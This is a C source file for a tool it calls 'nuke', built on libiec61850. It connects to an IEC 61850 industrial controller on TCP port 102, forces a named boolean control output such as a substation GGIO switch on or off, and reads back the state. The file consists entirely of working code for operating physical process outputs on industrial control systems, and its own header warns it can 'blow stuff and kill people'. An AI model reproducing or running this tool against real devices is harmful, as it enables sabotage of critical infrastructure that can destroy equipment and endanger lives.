/*
 * The nuke tool is based  on libiec61850 and supports switching outputs of 
 * intelligent electronic devices (IED) outputs. Specifically, any 
 * controllable point that can be operated with boolean (true/false) can be 
 * switched. This has been tested on IEDs that provide single point controls 
 * (SPCs) within their generic logical input/output node (GGIO).
 *
 *
 * WARNING WARNING WARNING WARNING WARNING WARNING WARNING WARNING WARNING
 * 
 * Switching might affect the related process, cause severe damage to devices,
 * the environment or life.
 *
 * YOU CAN BLOW STUFF AND KILL PEOPLE 
 *
 *
 * Known bugs
 * - the nuke tool assumes the IED service is bound to port TCP/102
 * 
 */

#include "iec61850_client.h"
#include "hal_thread.h"

#include <stdlib.h>
#include <stdio.h>

#define __STDC_FORMAT_MACROS
#include <inttypes.h>

static void operate(IedConnection con, char* sp, bool flag) {
	
    printf("operating: %s: ", sp);

    ControlObjectClient control = ControlObjectClient_create(sp, con);

    MmsValue* ctlVal;

    if (flag)
        ctlVal = MmsValue_newBoolean(true);
    else
        ctlVal = MmsValue_newBoolean(false);

    if (ControlObjectClient_operate(control, ctlVal, 0)) {
        printf("%s.\n", ctlVal ? "true" : "false");
    }
    else {
        printf("failed.\n");
    }

    MmsValue_delete(ctlVal);
    ControlObjectClient_destroy(control);
}

int main(int argc, char** argv) {
	
    char* hostname = "localhost";
    int tcpPort = 102;
    bool onoff = false;
    char* refName ="";

    if (argc == 4) {
        hostname = argv[1];
        refName = argv[2];

        if (strncmp("true", argv[3], 4) == 0)
            onoff= true;
    }
    else {
        printf("Usage examples:\n");
        printf("%s localhost ServerLogicalDevice/GGIO1.SPCSO1 true\n", argv[0]);
        return 1;
    }

    MmsValue* ctlVal = MmsValue_newBoolean(onoff);
    
    IedClientError error;
    IedConnection con = IedConnection_create();
    IedConnection_connect(con, &error, hostname, tcpPort);
    
    if (error == IED_ERROR_OK) {
        ControlObjectClient control = ControlObjectClient_create(refName, con);

        if (control) {
            if (ControlObjectClient_operate(control, ctlVal, 0)) {
                printf("operation successfull, new state: ");

                // append .stVal to reference name
                char * refNameStVal;

                if ((refNameStVal = malloc(strlen(refName)+strlen(".stVal")+1)) != NULL) {
                    refNameStVal[0] = '\0';
                    strcat(refNameStVal,refName);
                    strcat(refNameStVal,".stVal");
                } 
                else {
                    printf("malloc failed! exiting\n");
                    exit(1);
                }

                MmsValue* stVal = IedConnection_readObject(con, &error, refNameStVal, IEC61850_FC_ST);

                if (error == IED_ERROR_OK) {
                    bool state = MmsValue_getBoolean(stVal);
                    MmsValue_delete(stVal);
                    printf("%i\n", state);
                }
                else {
                    printf("failed reading state. exiting.\n");
                }
            }
            else {
                printf("operation failed.exiting.\n");
            }       
                
            ControlObjectClient_destroy(control); 
            IedConnection_close(con);
            MmsValue_delete(ctlVal);
        }
        else {
            printf("control selection failed. exiting.\n");
        }
    }
    else {
    	printf("connection setup failed. exiting.\n");
    }

    IedConnection_destroy(con);
    return 0;
}


